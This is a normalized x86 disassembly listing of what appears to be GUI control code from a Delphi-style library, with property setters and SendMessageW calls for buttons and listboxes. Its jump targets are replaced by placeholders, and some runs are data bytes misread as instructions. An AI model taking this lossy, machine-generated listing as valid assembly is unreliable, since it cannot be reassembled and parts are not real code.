cmp dl [ esi + 0x284 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x284 ] dl
mov ebx [ esi + 0x298 ]
test ebx ebx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
call sub_44f4cc
mov edx eax
mov eax esi
call sub_45e518
sub_45e4b0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x28c ]
cmp edx eax
je r-xdata
pop esi
pop ebx
retn
mov ebx eax
mov eax edx
mov [ esi + 0x28c ] eax
mov edx [ esi + 0x298 ]
test edx edx
je r-xdata
inc eax
je r-xdata
mov eax edx
call sub_44f788
xor edx edx
mov eax esi
call sub_45e518
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
inc ebx
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ esi + 0x298 ]
call sub_44f4cc
mov edx eax
mov eax esi
call sub_45e518
jmp r-xdata
sub_45e518
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
mov edx 0x1
mov eax 0x5
call sub_43a7f0
movzx eax [ ebx + 0x27c ]
xor al 0x1
jmp r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
movzx eax [ ebx + 0x284 ]
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x14 ] eax
mov esi [ ebx + 0x290 ]
mov eax [ esi + 0x8 ]
push eax
lea eax [ esp + 0x1c ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
call sub_422fe4
lea esi [ esp + 0x18 ]
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_496868
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x1602
push ebx
call SendMessageW
test al al
je r-xdata
sub_45e5b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x294 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x294 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x288 ]
call sub_44fe8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov edx [ ebx + 0x288 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x294 ]
call sub_42e354
sub_45e604
push esi
mov esi eax
cmp edx [ esi + 0x2a0 ]
je r-xdata
pop esi
retn
mov [ esi + 0x2a0 ] edx
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45e634
push esi
mov esi eax
cmp edx [ esi + 0x2a4 ]
je r-xdata
pop esi
retn
mov [ esi + 0x2a4 ] edx
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45e664
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2a8 ]
cmp bl al
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test [ edx + 0x1c ] 0x1
je r-xdata
mov edx ebx
sub dl 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a8 ] bl
jmp r-xdata
cmp al 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a8 ] bl
mov eax [ ebp - 0x4 ]
call sub_492ec4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x194 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x88 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x40
setne al
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
dec dl
jne r-xdata
xor eax eax
push ebp
push sub_45e7b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26c ] 0x0
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0xaf
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26c ] 0x0
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
call sub_48d62c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a8 ] bl
mov eax [ ebp - 0x4 ]
call sub_492ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov edx 0xaf
mov eax [ ebp - 0x4 ]
call sub_48d5f8
retn
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
sub_45e7ca
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45dd48
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4925ec
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
movzx eax [ ebx + 0x270 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
movzx eax [ ebx + 0x2a8 ]
dec al
je r-xdata
movzx eax [ ebx + 0x270 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
pop esi
pop ebx
retn
movzx eax [ ebx + 0x270 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
jmp r-xdata
jmp r-xdata
movzx eax [ ebx + 0x270 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_45e852
add [ eax ] al
inc edx
add [ ebp ] dl
push esp
add [ eax + eax + 0x4f ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4927d4
movzx eax [ ebx + 0x270 ]
mov [ ebx + 0x268 ] al
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45e404
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
cmp [ ebx + 0x2a8 ] 0x1
jne r-xdata
mov eax ebx
call sub_45e914
sub_45e8a4
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0x288 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
cmp [ esi + 0x298 ] 0x0
je r-xdata
lea eax [ esi + 0x290 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
lea eax [ esi + 0x298 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45e914
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_496868
mov esi eax
mov eax [ ebx + 0x26c ]
call sub_449db8
push eax
push 0x0
push 0x1609
push esi
call SendMessageW
sub_45e964
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
cmp [ ebx + 0x298 ] 0x0
je r-xdata
mov eax [ ebx + 0x298 ]
call sub_44f4cc
mov edx eax
mov eax ebx
call sub_45e518
sub_45e99c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45e9bc
push ebx
mov ebx eax
mov eax ebx
call sub_490858
mov eax ebx
call sub_45e404
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
cmp [ ebx + 0x2a8 ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45e914
sub_45e9ec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_492594
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x278 ]
jne r-xdata
cmp esi [ edi + 0x294 ]
jne r-xdata
xor eax eax
mov [ edi + 0x278 ] eax
xor eax eax
mov [ edi + 0x294 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_45ea4c
push esi
push edi
push ebp
mov ebp edx
mov edi eax
cmp [ ebp + 0x4 ] 0xd
jne r-xdata
cmp [ ebp + 0x4 ] 0x1b
jne r-xdata
cmp [ edi + 0x268 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_495bf8
cmp [ edi + 0x269 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_476ee8
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax edi
mov si 0xffeb
call sub_4483f8
mov [ ebp + 0xc ] 0x1
jmp r-xdata
pop ebp
pop edi
pop esi
retn
sub_45eab9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45eb3f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_48df68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
call sub_476f74
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_495c00
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax edi
mov si 0xffeb
call sub_4483f8
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eb46
sub_45eb4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
movzx eax [ ebx + 0x270 ]
mov [ ebx + 0x268 ] al
cmp ebx edi
sete al
mov [ ebx + 0x268 ] al
jmp r-xdata
movzx edx [ ebx + 0x268 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov edx esi
mov eax ebx
call sub_495c08
pop edi
pop esi
pop ebx
retn
sub_45eba0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45ebcc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
call sub_44c2c8
mov esi eax
mov eax esi
call sub_44c3d4
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax esi
call sub_44c568
cmp [ eax + 0x254 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x4 ]
mov eax ebx
call sub_48ab2c
jmp r-xdata
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
sub_45ec34
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffb20
jne r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
cmp [ ebx + 0x278 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
mov eax [ esi + 0x8 ]
lea esi [ eax + 0xc ]
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x8 ]
call sub_422fbc
lea edx [ esp + 0x18 ]
mov ecx esp
mov eax ebx
call sub_48d98c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ ebx + 0x278 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
sub_45ecb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45db6c
mov edx 0x61
mov eax esi
call sub_48d5f8
mov edx 0x11
mov eax esi
call sub_48d62c
mov dl 0x1
mov eax esi
call sub_496b44
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x268 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_45ed1c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc7
call sub_4483f8
test al al
jne r-xdata
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45ed48
movzx edx [ eax + 0x26a ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x269 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_45edd0
retn
mov dl 0x2
call sub_45edd0
jmp r-xdata
xor edx edx
call sub_45edd0
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_45edd0
jmp r-xdata
sub_45edd0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x26a ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x26a ] dl
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x260 ] 0x0
jne r-xdata
push 0x0
movzx eax [ ebx + 0x26a ]
push eax
push 0xf1
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax ebx
mov si 0xffeb
call sub_4483f8
sub_45ee20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_45dd48
mov ecx sub_45ee70
mov edx edi
mov eax ebx
call sub_4925ec
mov eax ebx
mov si 0xffc7
call sub_4483f8
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
movzx edx [ ebx + 0x268 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_45ee70
inc edx
add [ ebp ] dl
push esp
add [ eax + eax + 0x4f ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4927d4
push 0x0
movzx eax [ ebx + 0x26a ]
push eax
push 0xf1
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45eec8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ef56
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x4 ]
movzx eax [ edi + 0x4 ]
call sub_476f74
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_495c00
mov eax ebx
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov si 0xffb3
call sub_4483f8
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ef5d
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_45ef74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45db6c
mov edx 0x71
mov eax esi
call sub_48d5f8
mov edx 0x11
mov eax esi
call sub_48d62c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x268 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_45efdc
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc7
call sub_4483f8
test al al
jne r-xdata
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45f01c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4924f8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_451728
sub_45f0d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x269 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x269 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_496b44
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SendMessageW
push ebp
call sub_45f01c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_48db88
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x260 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4483f8
sub_45f164
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_45dd48
mov ecx sub_45f1b0
mov edx edi
mov eax ebx
call sub_4925ec
mov eax ebx
mov si 0xffc7
call sub_4483f8
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
movzx edx [ ebx + 0x268 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_45f1b0
inc edx
add [ ebp ] dl
push esp
add [ eax + eax + 0x4f ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4927d4
push 0x0
movzx eax [ ebx + 0x269 ]
push eax
push 0xf1
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45f1f0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45f272
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_48df68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
call sub_476f74
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_495c00
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f279
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
sub_45f280
push esi
movzx edx [ edx + 0x6 ]
sub dx 0x1
jb r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xe0 ]
pop esi
retn
sub dx 0x4
je r-xdata
mov si 0xffea
call sub_4483f8
jmp r-xdata
pop esi
retn
sub_45f2c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f38d
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x1c ]
movzx eax [ esi + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_496868
push eax
call SendMessageW
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_461194
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_449fd0
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_425c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f394
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_449db8
push eax
push edi
push 0x189
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_449fd0
sub_45f39c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45f420
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x1c ]
movzx eax [ edi + 0x290 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffae
call sub_4483f8
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4611b4
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f427
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_425c00
sub_45f430
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov ebp eax
mov edx edi
mov eax [ ebx + 0x1c ]
mov si 0xffb0
call sub_4483f8
mov [ esp + 0x4 ] eax
xor ecx ecx
mov edx edi
mov eax [ ebx + 0x1c ]
mov si 0xffaf
call sub_4483f8
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax ebx
mov esi [ eax ]
call [ esi + 0x64 ]
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax [ ebx + 0x1c ]
mov si 0xffaf
call sub_4483f8
mov edx ebp
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45f4ac
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
movzx eax [ eax + 0x290 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x1c ]
mov si 0xffad
call sub_4483f8
sub_45f4d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45f55c
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x1c ]
movzx eax [ edi + 0x290 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f563
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax edi
call sub_496868
xor ecx ecx
mov edx 0x180
call sub_41f080
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_45f56c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f5f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x1c ]
movzx eax [ esi + 0x290 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f5f8
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_496868
mov ecx edi
mov edx 0x181
call sub_41f080
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_45f610
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45f764
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
movzx eax [ eax + 0x290 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f76b
lea eax [ ebp - 0x10 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x8 ]
call sub_425a78
xor eax eax
push ebp
push sub_45f73f
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov si 0xffb0
call sub_4483f8
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx edi
mov si 0xffb0
call sub_4483f8
mov ecx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx ebx
mov si 0xffaf
call sub_4483f8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
